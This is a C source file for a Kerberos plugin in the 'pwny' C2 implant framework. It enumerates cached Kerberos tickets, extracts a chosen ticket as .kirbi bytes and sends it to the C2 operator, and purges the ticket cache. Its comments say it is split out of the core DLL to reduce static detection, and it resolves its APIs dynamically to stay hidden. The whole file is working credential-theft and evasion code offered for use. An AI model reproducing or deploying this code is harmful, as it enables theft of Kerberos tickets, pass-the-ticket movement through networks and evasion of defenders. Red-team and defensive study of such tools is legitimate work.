/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Kerberos tab plugin — ticket enumeration, extraction, and purge.
 *
 * Moved out of the core DLL to reduce the static detection
 * surface. Loaded on demand as a COT plugin.
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>

#define WIN32_NO_STATUS
#include <windows.h>
#undef WIN32_NO_STATUS
#include <ntsecapi.h>

#define COT_PLUGIN
#include <pwny/tab_cot.h>

/* ------------------------------------------------------------------ */
/* Win32 function pointer types — resolved at init via cot_resolve()   */
/* ------------------------------------------------------------------ */

typedef int      (WINAPI *fn_WideCharToMultiByte)(UINT, DWORD, LPCWCH, int,
                                                   LPSTR, int, LPCCH, LPBOOL);
typedef int      (WINAPI *fn_MultiByteToWideChar)(UINT, DWORD, LPCCH, int,
                                                   LPWSTR, int);
typedef NTSTATUS (WINAPI *fn_LsaConnectUntrusted)(PHANDLE);
typedef NTSTATUS (WINAPI *fn_LsaLookupAuthenticationPackage)(HANDLE,
                                                              PLSA_STRING,
                                                              PULONG);
typedef NTSTATUS (WINAPI *fn_LsaDeregisterLogonProcess)(HANDLE);
typedef NTSTATUS (WINAPI *fn_LsaCallAuthenticationPackage)(HANDLE, ULONG,
                                                            PVOID, ULONG,
                                                            PVOID *, PULONG,
                                                            PNTSTATUS);
typedef NTSTATUS (WINAPI *fn_LsaFreeReturnBuffer)(PVOID);

static struct
{
    fn_WideCharToMultiByte             pWideCharToMultiByte;
    fn_MultiByteToWideChar             pMultiByteToWideChar;
    fn_LsaConnectUntrusted             pLsaConnectUntrusted;
    fn_LsaLookupAuthenticationPackage  pLsaLookupAuthenticationPackage;
    fn_LsaDeregisterLogonProcess       pLsaDeregisterLogonProcess;
    fn_LsaCallAuthenticationPackage    pLsaCallAuthenticationPackage;
    fn_LsaFreeReturnBuffer             pLsaFreeReturnBuffer;
} w;

/* Inline _strdup replacement using vtable malloc */

static __inline char *cot_strdup(const char *s)
{
    size_t len = strlen(s) + 1;
    char *d = (char *)malloc(len);
    if (d) memcpy(d, s, len);
    return d;
}


#define KERBEROS_LIST \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL)

#define KERBEROS_DUMP \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 1)

#define KERBEROS_PURGE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 2)

#define KERBEROS_TYPE_CLIENT   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
#define KERBEROS_TYPE_SERVER   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 1)
#define KERBEROS_TYPE_REALM    TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 2)
#define KERBEROS_TYPE_ENCTYPE  TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE)
#define KERBEROS_TYPE_FLAGS    TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE + 1)
#define KERBEROS_TYPE_START    TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE + 2)
#define KERBEROS_TYPE_END      TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE + 3)
#define KERBEROS_TYPE_RENEW    TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE + 4)
#define KERBEROS_TYPE_KIRBI    TLV_TYPE_CUSTOM(TLV_TYPE_BYTES, TAB_BASE, API_TYPE)

/* Helper: Convert a UNICODE_STRING to a malloc'd UTF-8 string */

static char *kerb_unicode_to_utf8(UNICODE_STRING *us)
{
    int len;
    char *buf;

    if (us == NULL || us->Buffer == NULL || us->Length == 0)
    {
        return cot_strdup("");
    }

    len = w.pWideCharToMultiByte(CP_UTF8, 0, us->Buffer,
                                 us->Length / sizeof(WCHAR),
                                 NULL, 0, NULL, NULL);
    if (len <= 0)
    {
        return cot_strdup("");
    }

    buf = (char *)calloc(1, len + 1);
    if (buf == NULL)
    {
        return cot_strdup("");
    }

    w.pWideCharToMultiByte(CP_UTF8, 0, us->Buffer,
                           us->Length / sizeof(WCHAR),
                           buf, len, NULL, NULL);

    return buf;
}

/* Helper: Open an LSA untrusted handle and look up the Kerberos package */

static NTSTATUS kerb_open_lsa(HANDLE *phLsa, ULONG *pAuthPkg)
{
    NTSTATUS status;
    LSA_STRING pkgName;

    status = w.pLsaConnectUntrusted(phLsa);
    if (status != 0)
    {
        return status;
    }

    pkgName.Buffer = "Kerberos";
    pkgName.Length = 8;
    pkgName.MaximumLength = 9;

    status = w.pLsaLookupAuthenticationPackage(*phLsa, &pkgName, pAuthPkg);
    if (status != 0)
    {
        w.pLsaDeregisterLogonProcess(*phLsa);
        *phLsa = NULL;
    }

    return status;
}

/* Helper: Convert LARGE_INTEGER (Windows FILETIME) to Unix epoch */

static int filetime_to_epoch(LARGE_INTEGER *ft)
{
    if (ft->QuadPart == 0)
    {
        return 0;
    }

    return (int)((ft->QuadPart / 10000000ULL) - 11644473600ULL);
}

/*
 * List cached Kerberos tickets (TGTs + TGSs).
 */

static tlv_pkt_t *kerberos_list(c2_t *c2)
{
    HANDLE hLsa = NULL;
    ULONG authPkg = 0;
    NTSTATUS status;
    NTSTATUS pkgStatus;

    KERB_QUERY_TKT_CACHE_REQUEST cacheReq;
    PKERB_QUERY_TKT_CACHE_EX_RESPONSE cacheResp = NULL;
    ULONG respLen = 0;

    tlv_pkt_t *result;
    ULONG i;

    status = kerb_open_lsa(&hLsa, &authPkg);
    if (status != 0)
    {
        log_debug("* kerberos: LsaConnectUntrusted failed (0x%lx)\n",
                  (unsigned long)status);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    memset(&cacheReq, 0, sizeof(cacheReq));
    cacheReq.MessageType = KerbQueryTicketCacheExMessage;
    cacheReq.LogonId.LowPart = 0;
    cacheReq.LogonId.HighPart = 0;

    status = w.pLsaCallAuthenticationPackage(
        hLsa, authPkg,
        &cacheReq, sizeof(cacheReq),
        (PVOID *)&cacheResp, &respLen,
        &pkgStatus
    );

    if (status != 0 || pkgStatus != 0 || cacheResp == NULL)
    {
        log_debug("* kerberos: query ticket cache failed (0x%lx / 0x%lx)\n",
                  (unsigned long)status, (unsigned long)pkgStatus);
        w.pLsaDeregisterLogonProcess(hLsa);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    for (i = 0; i < cacheResp->CountOfTickets; i++)
    {
        PKERB_TICKET_CACHE_INFO_EX ticket = &cacheResp->Tickets[i];
        tlv_pkt_t *entry;
        char *client;
        char *server;
        char *realm;

        entry = tlv_pkt_create();

        client = kerb_unicode_to_utf8(&ticket->ClientName);
        server = kerb_unicode_to_utf8(&ticket->ServerName);
        realm = kerb_unicode_to_utf8(&ticket->ClientRealm);

        tlv_pkt_add_string(entry, KERBEROS_TYPE_CLIENT, client);
        tlv_pkt_add_string(entry, KERBEROS_TYPE_SERVER, server);
        tlv_pkt_add_string(entry, KERBEROS_TYPE_REALM, realm);
        tlv_pkt_add_u32(entry, KERBEROS_TYPE_ENCTYPE, ticket->EncryptionType);
        tlv_pkt_add_u32(entry, KERBEROS_TYPE_FLAGS, ticket->TicketFlags);
        tlv_pkt_add_u32(entry, KERBEROS_TYPE_START,
                         filetime_to_epoch(&ticket->StartTime));
        tlv_pkt_add_u32(entry, KERBEROS_TYPE_END,
                         filetime_to_epoch(&ticket->EndTime));
        tlv_pkt_add_u32(entry, KERBEROS_TYPE_RENEW,
                         filetime_to_epoch(&ticket->RenewTime));

        tlv_pkt_add_tlv(result, TLV_TYPE_GROUP, entry);
        tlv_pkt_destroy(entry);

        free(client);
        free(server);
        free(realm);
    }

    w.pLsaFreeReturnBuffer(cacheResp);
    w.pLsaDeregisterLogonProcess(hLsa);

    return result;
}

/*
 * Dump a specific ticket as raw .kirbi bytes.
 */

static tlv_pkt_t *kerberos_dump(c2_t *c2)
{
    HANDLE hLsa = NULL;
    ULONG authPkg = 0;
    NTSTATUS status;
    NTSTATUS pkgStatus;

    char server_utf8[512];
    wchar_t server_w[512];
    int wlen;

    ULONG reqSize;
    PKERB_RETRIEVE_TKT_REQUEST pReq = NULL;
    PKERB_RETRIEVE_TKT_RESPONSE pResp = NULL;
    ULONG respLen = 0;

    tlv_pkt_t *result;

    if (tlv_pkt_get_string(c2->request, KERBEROS_TYPE_SERVER,
                           server_utf8) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    wlen = w.pMultiByteToWideChar(CP_UTF8, 0, server_utf8, -1,
                                  server_w, 512);
    if (wlen <= 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    status = kerb_open_lsa(&hLsa, &authPkg);
    if (status != 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    reqSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + (wlen * sizeof(wchar_t));
    pReq = (PKERB_RETRIEVE_TKT_REQUEST)calloc(1, reqSize);

    if (pReq == NULL)
    {
        w.pLsaDeregisterLogonProcess(hLsa);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    pReq->MessageType = KerbRetrieveEncodedTicketMessage;
    pReq->LogonId.LowPart = 0;
    pReq->LogonId.HighPart = 0;
    pReq->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;

    pReq->TargetName.Length = (USHORT)((wlen - 1) * sizeof(wchar_t));
    pReq->TargetName.MaximumLength = (USHORT)(wlen * sizeof(wchar_t));
    pReq->TargetName.Buffer = (PWSTR)(pReq + 1);

    memcpy(pReq->TargetName.Buffer, server_w, wlen * sizeof(wchar_t));

    status = w.pLsaCallAuthenticationPackage(
        hLsa, authPkg,
        pReq, reqSize,
        (PVOID *)&pResp, &respLen,
        &pkgStatus
    );

    if (status != 0 || pkgStatus != 0 || pResp == NULL)
    {
        log_debug("* kerberos: retrieve ticket failed (0x%lx / 0x%lx)\n",
                  (unsigned long)status, (unsigned long)pkgStatus);
        free(pReq);
        w.pLsaDeregisterLogonProcess(hLsa);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    if (pResp->Ticket.EncodedTicketSize > 0 &&
        pResp->Ticket.EncodedTicket != NULL)
    {
        tlv_pkt_add_bytes(result, KERBEROS_TYPE_KIRBI,
                          pResp->Ticket.EncodedTicket,
                          pResp->Ticket.EncodedTicketSize);
    }

    w.pLsaFreeReturnBuffer(pResp);
    free(pReq);
    w.pLsaDeregisterLogonProcess(hLsa);

    return result;
}

/*
 * Purge all cached Kerberos tickets.
 */

static tlv_pkt_t *kerberos_purge(c2_t *c2)
{
    HANDLE hLsa = NULL;
    ULONG authPkg = 0;
    NTSTATUS status;
    NTSTATUS pkgStatus;

    KERB_PURGE_TKT_CACHE_REQUEST purgeReq;
    PVOID pResp = NULL;
    ULONG respLen = 0;

    status = kerb_open_lsa(&hLsa, &authPkg);
    if (status != 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    memset(&purgeReq, 0, sizeof(purgeReq));
    purgeReq.MessageType = KerbPurgeTicketCacheMessage;
    purgeReq.LogonId.LowPart = 0;
    purgeReq.LogonId.HighPart = 0;

    status = w.pLsaCallAuthenticationPackage(
        hLsa, authPkg,
        &purgeReq, sizeof(purgeReq),
        &pResp, &respLen,
        &pkgStatus
    );

    if (pResp)
    {
        w.pLsaFreeReturnBuffer(pResp);
    }

    w.pLsaDeregisterLogonProcess(hLsa);

    if (status != 0 || pkgStatus != 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

COT_ENTRY
{
    /* Resolve kernel32.dll functions */
    w.pWideCharToMultiByte = (fn_WideCharToMultiByte)cot_resolve("kernel32.dll",
                                                                 "WideCharToMultiByte");
    w.pMultiByteToWideChar = (fn_MultiByteToWideChar)cot_resolve("kernel32.dll",
                                                                 "MultiByteToWideChar");

    /* Resolve secur32.dll functions */
    w.pLsaConnectUntrusted            = (fn_LsaConnectUntrusted)cot_resolve(
                                             "secur32.dll", "LsaConnectUntrusted");
    w.pLsaLookupAuthenticationPackage = (fn_LsaLookupAuthenticationPackage)cot_resolve(
                                             "secur32.dll", "LsaLookupAuthenticationPackage");
    w.pLsaDeregisterLogonProcess      = (fn_LsaDeregisterLogonProcess)cot_resolve(
                                             "secur32.dll", "LsaDeregisterLogonProcess");
    w.pLsaCallAuthenticationPackage   = (fn_LsaCallAuthenticationPackage)cot_resolve(
                                             "secur32.dll", "LsaCallAuthenticationPackage");
    w.pLsaFreeReturnBuffer            = (fn_LsaFreeReturnBuffer)cot_resolve(
                                             "secur32.dll", "LsaFreeReturnBuffer");

    api_call_register(api_calls, KERBEROS_LIST, (api_t)kerberos_list);
    api_call_register(api_calls, KERBEROS_DUMP, (api_t)kerberos_dump);
    api_call_register(api_calls, KERBEROS_PURGE, (api_t)kerberos_purge);
}

#endif
